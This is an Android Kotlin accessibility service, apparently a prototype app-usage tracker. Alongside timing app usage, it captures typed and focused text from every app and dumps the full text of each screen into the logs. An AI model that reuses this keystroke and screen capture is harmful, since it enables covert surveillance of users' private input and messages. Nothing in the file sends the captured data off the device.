package com.talla.accessibilityservice.data.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.lifecycle.LiveData
import androidx.lifecycle.MutableLiveData
import com.talla.accessibilityservice.data.repository.AppUsageRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class AppTrackerServices : AccessibilityService() {
    private val TAG = "AppTrackerServices"
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private lateinit var repository: AppUsageRepository
    private var currentPackageName: String? = null
    private var currentStartTime: Long = 0L

    companion object {
        private val _isServiceRunning = MutableLiveData<Boolean>()
        val isServiceRunning: LiveData<Boolean> = _isServiceRunning
    }

    override fun onCreate() {
        super.onCreate()
        repository = AppUsageRepository(applicationContext)
        _isServiceRunning.postValue(true)
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        // FORCE the flags in code to ensure they are active
        val info = serviceInfo ?: AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.notificationTimeout = 100
        info.flags = info.flags or 
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
        serviceInfo = info

        Log.e(TAG, "###############################################")
        Log.e(TAG, "SERVICE CONNECTED & FLAGS FORCED")
        Log.e(TAG, "###############################################")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val events = event ?: return
        
        try {
            val eventType = AccessibilityEvent.eventTypeToString(events.eventType)
            val packageName = events.packageName?.toString() ?: "Unknown"

            // 1. Heartbeat - Visible in RED
            Log.e(TAG, ">>> EVENT: $eventType | App: $packageName")

            // --- 2. APP USAGE TRACKING ---
            if (events.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (packageName != "Unknown" && packageName != currentPackageName) {
                    val timeStamp = System.currentTimeMillis()
                    if (currentPackageName != null && currentStartTime != 0L) {
                        logAppUsage(currentPackageName!!, currentStartTime, timeStamp)
                    }
                    currentPackageName = packageName
                    currentStartTime = timeStamp
                }
            }

            // --- 3. KEYBOARD / TEXT CAPTURE ---
            if (events.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
                events.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
                
                val eventText = events.text.joinToString("") { it.toString() }
                val sourceText = events.source?.text?.toString() ?: ""
                
                if (eventText.isNotBlank() || sourceText.isNotBlank()) {
                    Log.e(TAG, "!!!! DATA CAPTURED IN $packageName !!!!")
                    Log.e(TAG, "CONTENT: $eventText | SOURCE: $sourceText")
                }
            }

            // --- 4. SCREEN CONTENT CAPTURE ---
            if (events.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                events.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                events.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                
                Log.e(TAG, "--- STARTING FULL SCREEN SCRAPE [$packageName] ---")
                val rootNode = rootInActiveWindow ?: events.source
                if (rootNode != null) {
                    dumpNodeInfo(rootNode, 0)
                }
                Log.e(TAG, "--- END SCREEN SCRAPE ---")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in onAccessibilityEvent", e)
        }
    }

    private fun dumpNodeInfo(node: AccessibilityNodeInfo?, depth: Int) {
        if (node == null) return
        if (depth > 50) return
        
        val indent = "  ".repeat(depth)
        val text = node.text?.toString()
        val desc = node.contentDescription?.toString()
        
        if (!text.isNullOrBlank() || !desc.isNullOrBlank()) {
            Log.e(TAG, "${indent}Found: [Text: $text] [Desc: $desc]")
        }

        for (i in 0 until node.childCount) {
            dumpNodeInfo(node.getChild(i), depth + 1)
        }
    }

    private fun logAppUsage(packageName: String, startTime: Long, endTime: Long) {
        serviceScope.launch {
            val duration = endTime - startTime
            Log.e(TAG, "logAppUsage: $packageName | Duration: ${duration}ms")
            repository.logAppUsageEvent(packageName, startTime, endTime)
        }
    }

    override fun onInterrupt() {}
}
